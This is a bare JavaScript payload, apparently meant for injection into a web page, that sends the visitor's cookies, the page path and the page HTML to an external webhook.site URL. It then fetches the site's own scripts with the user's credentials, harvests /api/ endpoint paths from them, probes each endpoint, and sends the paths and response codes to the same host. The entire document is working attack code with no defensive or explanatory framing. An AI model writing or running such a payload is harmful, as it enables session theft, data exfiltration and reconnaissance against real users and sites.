var W="https://webhook.site/e4e989f5-dfd9-487d-807d-d8023425485d";
function post(t,d){try{fetch(W+"/h?t="+t,{method:"POST",body:String(d).slice(0,9000)})}catch(e){}}
function uniq(a){var s={},o=[];a.forEach(function(x){if(!s[x]){s[x]=1;o.push(x)}});return o}
var srcs=[].slice.call(document.querySelectorAll("script[src],link[href]")).map(function(e){return e.src||e.href}).filter(function(u){return u&&u.indexOf(location.origin)===0});
post("dom",location.pathname+" || "+document.cookie+" || "+document.documentElement.outerHTML.slice(0,8000));
var found=[];
Promise.all(srcs.slice(0,25).map(function(u){return fetch(u,{credentials:"include"}).then(function(r){return r.text().then(function(t){return t})}).catch(function(){return ""})})).then(function(txts){
  txts.forEach(function(t){(t.match(/\/api\/[A-Za-z0-9_\/-]{2,60}/g)||[]).forEach(function(p){found.push(p.replace(/\/$/,""))})});
  found=uniq(found).slice(0,150);
  post("paths",found.join("\n"));
  var out=[];
  var i=0;
  function step(){
    if(i>=found.length){post("probe",out.join("\n"));return}
    var p=found[i++];
    fetch(p,{credentials:"include"}).then(function(r){out.push(r.status+" "+p);step()}).catch(function(){out.push("ERR "+p);step()});
  }
  step();
});
